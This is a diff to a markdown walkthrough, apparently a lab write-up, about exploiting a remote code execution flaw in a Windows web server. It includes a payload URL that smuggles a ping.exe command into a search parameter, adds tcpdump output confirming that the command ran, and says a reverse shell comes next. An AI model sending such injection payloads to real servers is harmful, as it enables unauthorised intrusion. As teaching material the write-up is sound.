@@ -90,6 +90,18 @@ Before we begin to exploit this we're going to make sure that our device is runn
 
 First, setup a tcpdump using `tcpdump -i eth0 ICMP` leave that running and capturing packets in a terminal, then browse to your webserver with the following URL `http://192.168.139.1/?search=%00{.exec|C:\Windows\System32\ping.exe+192.168.139.138.}` obviously you will need to replace the IP addresses else this won't work, when you run this what you should see is your tcpdump picking up packets, you will also see a terminal open on the Windows device if you're using it (for example in my case I have three screens and I can see the terminal open when I press enter in my Kali VM). Now, what we did here was verify that the version is affected by sending a payload to the device, in this case we just told it to execute ping.exe and then ping the ip address `192.168.139.138` which is the address of my Kali VM. It's worth noting that it seems you *must* use a full stop at the end of your command else the server will not execute it, at least that's in my experience.
 
+```bash
+root@LinxzSecKali:~# tcpdump -i eth0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+12:11:59.722051 IP 192.168.139.1 > LinxzSecKali: ICMP echo request, id 1, seq 33, length 40
+12:11:59.722080 IP LinxzSecKali > 192.168.139.1: ICMP echo reply, id 1, seq 33, length 40
+12:11:59.727859 IP 192.168.139.1 > LinxzSecKali: ICMP echo request, id 1, seq 34, length 40
+12:11:59.727886 IP LinxzSecKali > 192.168.139.1: ICMP echo reply, id 1, seq 34, length 40
+12:11:59.731815 IP 192.168.139.1 > LinxzSecKali: ICMP echo request, id 1, seq 35, length 40
+12:11:59.731918 IP LinxzSecKali > 192.168.139.1: ICMP echo reply, id 1, seq 35, length 40
+```
+
 Next we need to exploit this vulnerability in order to get a reverse shell, we know the RCE is there so let's figure out how we can leverage that to get full access to the account that's running the service.
 
 #### Metasploit Exploitation
